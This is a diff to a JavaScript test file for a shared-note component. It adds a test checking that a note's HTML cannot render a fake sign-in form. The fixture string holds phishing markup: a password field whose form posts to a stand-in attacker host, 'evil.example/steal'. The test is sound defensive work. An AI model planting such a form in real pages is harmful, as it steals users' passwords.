@@ -45,4 +45,15 @@ describe("SharedNote", () => {
     expect(await screen.findByRole("heading", { name: "Untitled" })).toBeInTheDocument();
     expect(screen.getByText(BRAND.name)).toBeInTheDocument();
   });
+
+  it("does not render a form a shared note carries (a fake sign-in page on our domain)", async () => {
+    const content =
+      '<p>Session expired</p><form action="https://evil.example/steal"><input type="password" name="pw"><button type="submit">Sign in</button></form>';
+    const body = { title: "Notice", content, tags: null, entity_type: null, created_at: "2026-09-01T00:00:00Z", updated_at: "2026-09-01T00:00:00Z" };
+    vi.stubGlobal("fetch", vi.fn().mockResolvedValue(new Response(JSON.stringify(body), { status: 200 })));
+    const { container } = renderAt();
+    expect(await screen.findByText("Session expired")).toBeInTheDocument();
+    expect(container.querySelector("form, input[type=password]")).toBeNull();
+    expect(screen.queryByRole("button", { name: "Sign in" })).not.toBeInTheDocument();
+  });
 });
